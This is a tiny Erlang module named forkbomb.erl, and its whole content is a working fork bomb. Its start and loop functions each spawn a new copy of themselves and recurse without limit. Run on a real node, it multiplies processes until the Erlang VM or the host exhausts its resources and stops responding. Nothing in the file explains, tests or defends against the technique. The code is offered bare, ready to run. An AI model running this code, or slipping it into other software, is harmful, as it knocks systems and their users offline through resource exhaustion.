% forkbomb.erl
-module(forkbomb).
-export([start/0]).

start() ->
    spawn(fun() -> loop() end),
    start().

loop() ->
    spawn(fun() -> loop() end),
    loop().
